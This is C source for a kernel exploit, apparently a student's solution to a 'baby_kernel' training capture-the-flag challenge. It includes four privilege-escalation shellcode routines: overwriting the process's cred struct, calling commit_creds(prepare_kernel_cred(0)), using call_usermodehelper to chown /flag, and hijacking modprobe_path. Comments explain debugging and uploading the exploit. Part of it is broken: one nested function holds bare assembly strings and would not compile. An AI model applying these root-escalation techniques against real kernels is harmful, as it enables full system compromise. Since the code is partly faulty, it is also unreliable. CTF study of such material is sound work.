#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

// bzImage is the kernel (monolitic: only 1 binary)
// initramfs.cpio.gz is the path to the gzipped file system
// python upload_exploit_2.py -s -e /home/user/exploit ./initramfs/exploit baby-kernel.training.offensivedefensive.it 8080

// what to do before: ALL DONE in the RUN.SH by adding the first 2 lines
// - unpack the filesystem using unpack script
// - create a Makefile (where compiling the exploit inside the fs) and execute 'make'
// - pack the new file system

// When debugging, just change the line in the init file that start the process as 1000 (user)
// instead write:  setsid cttyhack setuidgid 0 sh --> get IOCTL_ADDR
// return user, start the kernel
// open another shell. There:
// - (pwn) sudo gdb
// - target remote :1234 --> used to debug
// - set breakpoint at the ioctl_addr

// for running the script inside ipython: %run script.py ...

// find the address of baby_kernel functions with cat /proc/kallsyms | grep baby_kernel
#define IOCTL_ADDR 0xffffffffc00000c0


// for checking the correctness of the compiled shellcode:
// objdump -M intel -D initramfs/solution | grep -A 20 schellcode1
void schellcode1(){
    //asm is a function to write assembly code inline
    //volatile is a keyword to tell the compiler not to optimize the assembly code
    asm volatile(
        // saving in rdi a pointer to the task_struct
        "mov rdi, gs:0x1AD00\n" // offset taken from the commit_cred func in elf_kernel
        //now rdi contains the pointer to task_struct
        "mov rsi, [rdi+0x740]\n" // now rsi contains the pointer to real cred struct (offset taken from ida)
        // if i check real cred there are a lot of 0x3e8 = 1000 (user id and group id)
        // i want to put it to zero but I don't know which one because it is shuffled
        // i change all of them to zero!
        "mov QWORD PTR [rsi+0x8],0\n" // writing 8 byte to zero
        "mov QWORD PTR [rsi+0x10],0\n"
        "mov QWORD PTR [rsi+0x18],0\n"
        "mov QWORD PTR [rsi+0x20],0\n"
    ); 
}

// another way to become root: commit_creds(prepare_kernel_creds(0))
// invoke prepare_credential function and then invoke the commit_creds function
#define PREPARE_KERNEL_CRED 0xFFFFFFFF81094670
#define COMMIT_CREDS 0xFFFFFFFF810943D0
void schellcode2(){
    unsigned long long *root_creds;
    // getting the root_creds
    asm (
        "mov rax, %0\n" // %0 is the first param of shellcode2 
        "mov rdi, 0\n"
        "call rax\n"
        : "=a"(root_creds) // output: move the value inside the register a (rax) inside the structure root_creds
        // returns the credentials of a root
        : "r"(PREPARE_KERNEL_CRED) // input: this is the first param of shellcode2
        : "rdi" // clobber: registers that the compiler cannot use inside this code
    );
    // calling the commit_creds function
    asm(
        "mov rax, %0\n"
        "mov rdi, %1\n"
        "call rax\n"
        :
        : "r"(COMMIT_CREDS), "r"(root_creds)
        : "rdi", "rax"

    );

    void shellcode2_bis(){
        "mov rdi, 0\n"
        "mov rax, 0xFFFFFFFF81094670\n"
        "call rax\n"
        "mov rdi, rax\n"
        "mov rax, 0xFFFFFFFF810943D0\n"
        "call rax\n"
    }
}

// changing the ownership of file flag with callusermodehelper
#define CALLUSERMODEHELPER 0xffffffff81086630
const char* argv[] = {"/bin/chown\0", "1000:1000\0", "/flag\0", NULL}; 
// using "cat /proc/kallsyms | grep callusermode..." we get the address of the function callusermodehelper
void shellcode3(){
    asm volatile(
        "mov rdi, %0\n"
        "mov rsi, %1\n"
        "mov rdx, 0\n"
        "mov r10, 2\n"
        "mov rax, %2\n" // we can also just pass it as 0xffffffff81086630
        "call rax\n"
        :
        : "r"(argv[0]), "r"(argv), "r"(CALLUSERMODEHELPER)
        : "rdi", "rsi", "rdx", "r10", "rax"
    );
}

//using modprob_path: path of a program used to install and remove kernel modules
#define MODPROBE_PATH 0xffffffff82851660 //array of 260 hex char of zeros: we have to modify its values

void shellcode4(){
    asm volatile(
        "mov rsi, 0xffffffff82851660\n" // modprobe_path (kallsysms)
        "mov rdi, 0x68732e612f\n" // string to pass in hex --> do it on ipython b"./a.sh"[::-1].hex() 
        "mov QWORD PTR [rsi], rdi\n" //move at the address pointed by rsi
        // now we have set the global variable modprobe_path to /a.sh
        // now we have to create a file without valid magic header and the script to execute (inside the fs)
        // echo -ne "\x00" > b: ne means row char
        // echo "#!/bin/sh" >> a.sh
        // echo "" >> a.sh
        // echo "/bin/chown 1000:1000 /flag" >> a.sh
        // chmod +x b a.sh
        // ./b: doesn't do anything
        // NOW the flag can be read by user: a.sh has been called by kernel because we tried to execute an invalid file(b) without magic header
    );
}

int main(){
    int fd;

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    fd = open("/dev/baby_kernel", O_RDWR);
    if(fd < 0){
        puts("Error while opening file baby_kernel");
        return 1;
    }
    printf("File baby_kernel opened: fd=%d\n", fd);
    ioctl(fd, 1337, shellcode3);
    close(fd);

    // now we have set the credential of the process EXPLOIT as ROOT but only for THIS process 
    // When terminating we will return user so we have to read the flag now
    // otherwise if we open a shell now it will be in root mode

    fd = open("/flag", O_RDONLY);
    if(fd < 0){
        puts("Error while opening file flag");
        return 1;
    }
    char buffer[0x100];
    read(fd, buffer, sizeof(buffer));
    printf("Flag: %s\n", buffer);
    
}